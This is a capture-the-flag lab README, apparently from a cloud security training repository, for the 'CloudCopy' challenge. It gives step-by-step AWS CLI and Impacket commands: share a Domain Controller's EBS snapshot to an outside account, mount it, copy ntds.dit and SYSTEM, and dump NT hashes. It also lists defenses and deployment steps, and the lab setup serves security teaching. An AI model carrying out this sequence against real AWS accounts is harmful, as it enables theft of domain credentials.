# Challenge 04 - AWS Only: CloudCopy Attack

## Overview

This challenge demonstrates the **CloudCopy** attack technique, which involves stealing NTDS hashes from Windows Domain Controllers by exploiting EBS snapshot functionality. The attack leverages AWS permissions to access snapshots containing sensitive Active Directory data.

### Attack Technique
- **Name**: CloudCopy - EBS Snapshot NTDS Extraction
- **MITRE ATT&CK**: T1003.003 (OS Credential Dumping: NTDS)
- **Cloud Provider**: AWS
- **Difficulty**: Advanced

## Scenario

EkoCloudSec has deployed a Windows Server 2022 Domain Controller for the `ekocloudsec.local` domain in AWS. The infrastructure team has created EBS snapshots for backup purposes, but the IAM permissions are misconfigured, allowing unauthorized users to access and share these snapshots.

Your goal is to exploit this misconfiguration to extract NTDS hashes from the Domain Controller's snapshot.

## Infrastructure Components

### Domain Controller
- **Instance Type**: t3.medium
- **OS**: Windows Server 2022
- **Domain**: ekocloudsec.local
- **Role**: Primary Domain Controller
- **Users**: 
  - Administrator (Domain Admin)
  - admin.user (Domain Admin)
  - svc-flag (Service Account) - **TARGET**
  - john.doe (Domain User)
  - jane.smith (Domain User)

### EBS Snapshot
- **Purpose**: Backup of Domain Controller root volume
- **Contains**: Complete NTDS database and SYSTEM registry hive
- **Vulnerability**: Accessible via misconfigured IAM permissions

### IAM Configuration
- **User**: carlos.cardenas
- **Permissions**:
  - `ec2:DescribeSnapshots` - List all snapshots
  - `ec2:ModifySnapshotAttribute` - Share snapshots with other accounts
- **Restrictions**:
  - Cannot create new snapshots
  - Cannot launch instances in the lab account
  - Cannot create volumes in the lab account

## Attack Flow

### Prerequisites
- Personal AWS account (separate from the lab account)
- Linux instance in your personal account (for analysis)
- Tools: `secretsdump.py` (from Impacket)

### Step 1: Reconnaissance
Use the provided credentials for `carlos.cardenas` to explore the environment:

```bash
# Configure AWS CLI with carlos.cardenas credentials
aws configure --profile carlos
# AWS Access Key ID: [provided in outputs]
# AWS Secret Access Key: [provided in outputs]
# Default region: us-east-1

# List available snapshots
aws ec2 describe-snapshots --profile carlos --owner-ids self
```

### Step 2: Identify Target Snapshot
Look for snapshots with tags indicating they belong to a Domain Controller:

```bash
# Filter snapshots by tags
aws ec2 describe-snapshots --profile carlos \
  --filters "Name=tag:VictimDC,Values=EkoCloudSecDC" \
  --query 'Snapshots[*].[SnapshotId,Description,VolumeSize,Tags]'
```

### Step 3: Share Snapshot with Personal Account
Use the `ModifySnapshotAttribute` permission to share the snapshot:

```bash
# Replace SNAPSHOT_ID with the actual snapshot ID
# Replace YOUR_ACCOUNT_ID with your personal AWS account ID
aws ec2 modify-snapshot-attribute --profile carlos \
  --snapshot-id SNAPSHOT_ID \
  --attribute createVolumePermission \
  --operation-type add \
  --user-ids YOUR_ACCOUNT_ID
```

### Step 4: Copy Snapshot to Personal Account
Switch to your personal AWS account:

```bash
# Configure your personal account
aws configure --profile personal

# Copy the shared snapshot
aws ec2 copy-snapshot --profile personal \
  --source-region us-east-1 \
  --source-snapshot-id SNAPSHOT_ID \
  --description "Copied DC snapshot for analysis"
```

### Step 5: Create Volume from Snapshot
Create an EBS volume from the copied snapshot:

```bash
# Create volume in the same AZ as your analysis instance
aws ec2 create-volume --profile personal \
  --availability-zone us-east-1a \
  --snapshot-id COPIED_SNAPSHOT_ID \
  --volume-type gp3
```

### Step 6: Attach Volume to Analysis Instance
Attach the volume to your Linux analysis instance:

```bash
# Attach volume to instance
aws ec2 attach-volume --profile personal \
  --volume-id VOLUME_ID \
  --instance-id YOUR_INSTANCE_ID \
  --device /dev/sdf
```

### Step 7: Mount and Extract Files
On your Linux analysis instance:

```bash
# Create mount point
sudo mkdir /mnt/dc-snapshot

# Mount the volume (read-only for safety)
sudo mount -o ro /dev/xvdf2 /mnt/dc-snapshot

# Navigate to Windows directory
cd /mnt/dc-snapshot/Windows

# Copy NTDS database and SYSTEM hive
sudo cp NTDS/ntds.dit ~/ntds.dit
sudo cp System32/config/SYSTEM ~/SYSTEM

# Change ownership
sudo chown $USER:$USER ~/ntds.dit ~/SYSTEM
```

### Step 8: Extract Hashes with Secretsdump
Use Impacket's secretsdump.py to extract password hashes:

```bash
# Install Impacket if not already installed
pip3 install impacket

# Extract hashes
secretsdump.py -system ~/SYSTEM -ntds ~/ntds.dit local -outputfile secrets

# Look for the svc-flag user hash
grep "svc-flag" secrets.ntds
```

### Step 9: Submit Flag
The NT hash of the `svc-flag` user is your flag. It should be in the format:
```
CLD[uuidv4_format]
```

## Expected Hash Format
The flag will be the NT hash of the `svc-flag` user account, which should look like:
```
svc-flag:1001:aad3b435b51404eeaad3b435b51404ee:ACTUAL_NT_HASH_HERE:::
```

Extract the NT hash portion (after the third colon) and submit it as your flag.

## Defensive Measures

To prevent this attack:

1. **Least Privilege IAM Policies**
   - Restrict `ec2:ModifySnapshotAttribute` permissions
   - Use resource-based conditions in IAM policies
   - Implement proper snapshot sharing controls

2. **Snapshot Encryption**
   - Enable EBS encryption for all volumes
   - Use customer-managed KMS keys
   - Implement key rotation policies

3. **Monitoring and Alerting**
   - Monitor CloudTrail for `ModifySnapshotAttribute` events
   - Alert on unusual snapshot sharing activities
   - Implement automated response to suspicious activities

4. **Network Segmentation**
   - Isolate Domain Controllers in private subnets
   - Implement proper security group rules
   - Use VPC Flow Logs for monitoring

## Deployment Instructions

### Prerequisites
- Terraform >= 1.0
- AWS CLI configured with appropriate permissions
- Sufficient AWS credits (t3.medium instance costs)

### Deploy the Challenge

```bash
# Navigate to challenge directory
cd terraform/challenges/challenge-04-aws-only

# Initialize Terraform
terraform init

# Plan the deployment
terraform plan

# Apply the configuration
terraform apply
```

### Cleanup

```bash
# Destroy all resources
terraform destroy
```

## Troubleshooting

### Domain Controller Setup Issues
- Check CloudWatch logs for EC2 instance
- Verify user data script execution in `C:\Windows\Temp\dc_setup.log`
- Ensure sufficient time for AD DS installation (15+ minutes)

### Snapshot Access Issues
- Verify IAM permissions for carlos.cardenas user
- Check snapshot tags and resource conditions
- Ensure snapshot creation completed successfully

### Volume Mounting Issues
- Use `lsblk` to identify correct device name
- Try different mount points (xvdf1, xvdf2, etc.)
- Ensure read-only mount to prevent data corruption

## Security Considerations

⚠️ **Warning**: This challenge creates intentionally vulnerable infrastructure for educational purposes only. Do not deploy in production environments.

- Domain Controller has weak service account passwords
- EBS snapshots are unencrypted
- IAM permissions are overly permissive
- Network security groups allow broad access

## References

- [CloudCopy GitHub Repository](https://github.com/Static-Flow/CloudCopy)
- [CloudCopy Medium Article](https://medium.com/@_StaticFlow_/cloudcopy-stealing-hashes-from-domain-controllers-in-the-cloud-c55747f0913)
- [MITRE ATT&CK T1003.003](https://attack.mitre.org/techniques/T1003/003/)
- [AWS EBS Snapshot Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSSnapshots.html)

## Challenge Validation

To validate the challenge setup:

1. Verify Domain Controller is running and domain is configured
2. Confirm EBS snapshot exists with proper tags
3. Test carlos.cardenas credentials and permissions
4. Ensure snapshot sharing functionality works
5. Validate that NTDS extraction produces expected hash

---

**Flag Format**: `CLD[uuidv4_format]`

**Estimated Completion Time**: 2-3 hours

**Skills Learned**:
- AWS EBS snapshot exploitation
- Active Directory NTDS database analysis
- IAM permission abuse
- Cross-account resource sharing
- Windows credential extraction techniques
